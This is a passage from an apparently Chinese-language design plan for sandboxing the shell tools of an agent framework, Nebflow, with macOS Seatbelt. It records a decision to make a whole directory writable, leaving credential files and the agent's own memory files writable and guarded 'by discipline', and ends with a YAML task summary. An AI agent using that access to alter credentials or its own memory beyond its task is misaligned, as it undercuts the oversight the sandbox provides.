- **整目录放行即终态**：不加新 deny、不建新配置面。残留风险（批次报告钉死）：凭据文件（vps.env/auth.json/logto-admin-credentials.txt/directmail.env）与记忆主文件（User.md、agents/Nebula/memory.md）从此节点可直写，靠纪律约束
- 节点价值：项目仓 git commit、plugin/agent 定义层、项目记忆、docs 归档由节点直接落盘，不再逐笔走宿主命令
- §5.1 WorkspaceWrite 行与 §5.2/D4 的「~/.nebflow 只读」口径就此废止（历史记录保留原文）

## 11. 结构化任务摘要（Manager 可读）

```yaml
task: nebflow-process-sandbox-p0
plan_doc: ~/.nebflow/docs/Nebflow/process-sandbox-plan.md
upstream: ~/.nebflow/docs/Nebflow/deepseek-harness-study.md（§4 优先级 1）
scope_p0:
  - new-package: src/main/scala/nebflow/core/sandbox/{Sandbox,SandboxConfig,SeatbeltBackend}.scala
  - modify: src/main/scala/nebflow/core/tools/shell.scala（buildProcessBuilder 增 sandbox 参数 + 透传）
  - modify: src/main/scala/nebflow/core/tools/BashTool.scala（ctx 解析 policy + fallback 三态）
  - config: nebflow.json 新增 sandbox.{mode,fallback,network}
  - platform: 仅 macOS（Windows/Linux P0 均走 mode=off 原路径）
copy_from_harness:
  - profiles.ts:38-58 SBPL 生成 → SeatbeltBackend.scala
  - roots.ts canonicalPath/writableRoots → roots 推导（/tmp→/private/tmp 陷阱，AC-8 钉死）
  - sandbox-local/index.ts:85-91 probe → 一次性功能探测 + 结果缓存
  - fail-closed: SandboxUnavailableException → ToolError(安装指引)
acceptance: AC-0..AC-8（见 §8，全部二值可断言；AC-0 编译+零回归为门槛）
out_of_scope_p0: [linux-bwrap, landlock, network-enforcement, escalation, per-session-policy, frontend-ui, write-edit-fence, rlimits]
reference_impl: /tmp/deepseek-harness/packages/sandbox/（只读；TS→Scala 对标表见 §3.1）
```

---

## 附录 A：架构图

### A.1 改动前后对比（执行链）

![改动前后对比](assets/before-after.svg)

### A.2 sandbox 模块内部设计（P0）

![模块设计](assets/module.svg)
